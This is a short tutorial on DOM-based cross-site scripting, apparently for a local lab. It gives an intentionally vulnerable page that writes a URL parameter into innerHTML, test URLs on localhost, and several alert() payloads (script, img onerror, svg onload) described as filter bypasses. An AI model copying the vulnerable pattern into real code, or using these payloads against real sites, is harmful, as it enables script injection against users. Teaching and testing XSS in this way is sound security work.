**XSS (Cross-Site Scripting)** — the most common attack vector in web security testing.

---

### **Step 1: DOM-Based XSS (as shown earlier)**

Here’s the vulnerable code again with clear testing steps:

#### **Vulnerable HTML (DOM-Based XSS)**:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DOM XSS Test</title>
</head>
<body>
    <h2>Message:</h2>
    <p id="output"></p>

    <script>
        // DOM XSS vulnerability
        const params = new URLSearchParams(window.location.search);
        const message = params.get("msg");
        if (message) {
            document.getElementById("output").innerHTML = message;
        }
    </script>
</body>
</html>
```

---

#### **How to Test:**
Open this in your browser and run:
```
    http://127.0.0.1:5500/XSS/DOM-Based%20XSS/index.html

    http://127.0.0.1:5500/XSS/DOM-Based%20XSS/index.html?msg=<script>alert('Hacked!')</script>
    🧨 Warning: Some browsers or extensions may sanitize or block inline <script> injections by default. If it doesn't pop an alert, try using a more sneaky payload (still for educational purposes only).
```

**Expected behavior**: JavaScript alert should pop up — this confirms the DOM is injecting raw unsanitized HTML/JS from the query parameter.

---

### 🕵️‍♂️ Alternative Payloads (for testing):

Try these in the `msg` parameter:
- Basic script:  
  ```
  <script>alert('XSS')</script>
  ```

- Image-based (often bypasses basic filters):
  ```
  <img src=x onerror=alert('XSS')>
  ```

- Inline event:
  ```
  <svg onload=alert('XSS')>
  ```